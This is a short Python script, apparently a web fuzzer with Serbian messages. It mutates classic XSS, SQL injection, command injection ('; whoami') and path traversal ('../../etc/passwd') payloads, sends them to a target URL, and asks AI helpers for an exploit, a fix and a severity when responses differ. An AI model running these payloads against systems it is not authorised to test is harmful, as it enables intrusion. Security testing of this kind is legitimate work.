
import requests
import sys
from logics.fuzz_gen import fuzz_payload
from logics.ai_tools import suggest_exploit, suggest_fix, classify_severity
from logics.generate_pdf import save_ai_report_to_pdf

def test_mutations(base_url, vuln_type):
    if "FUZZ" not in base_url:
        print("[!] URL mora sadržati 'FUZZ' kao mesto za payload.")
        return

    print(f"\n[+] Auto fuzz test za {vuln_type.upper()} na {base_url}\n")

    base_payloads = {
        "xss": "<script>alert(1)</script>",
        "sqli": "' OR 1=1--",
        "cmd": "; whoami",
        "lfi": "../../etc/passwd"
    }

    base = base_payloads.get(vuln_type.lower())
    if not base:
        print("[!] Nepoznat tip ranjivosti.")
        return

    mutations = fuzz_payload(base)

    try:
        baseline_resp = requests.get(base_url.replace("FUZZ", "base"), timeout=5)
        baseline_len = len(baseline_resp.text)
    except:
        baseline_len = 0

    for i, m in enumerate(mutations, 1):
        fuzzed_url = base_url.replace("FUZZ", m)
        try:
            r = requests.get(fuzzed_url, timeout=5)
            diff = len(r.text) - baseline_len
            status = r.status_code
            print(f"{i:02d}. [{status}] Δ {diff:+4} | {fuzzed_url}")

            if status == 200 and abs(diff) > 20:
                print("   [!] Značajna razlika detektovana! Pokrećem AI analizu...")

                exploit = suggest_exploit(r.text)
                fix = suggest_fix(r.text)
                severity = classify_severity(r.text)

                summary = f"[AUTO-FUZZ]\nPayload: {m}\nURL: {fuzzed_url}\nStatus: {status}\nΔ: {diff}\n\n"
                summary += f"[SEVERITY]: {severity}\n\n[EXPLOIT]\n{exploit}\n\n[FIX]\n{fix}\n"

                save_ai_report_to_pdf(summary, site=fuzzed_url)

        except Exception as e:
            print(f"{i:02d}. [ERR] {fuzzed_url} => {e}")
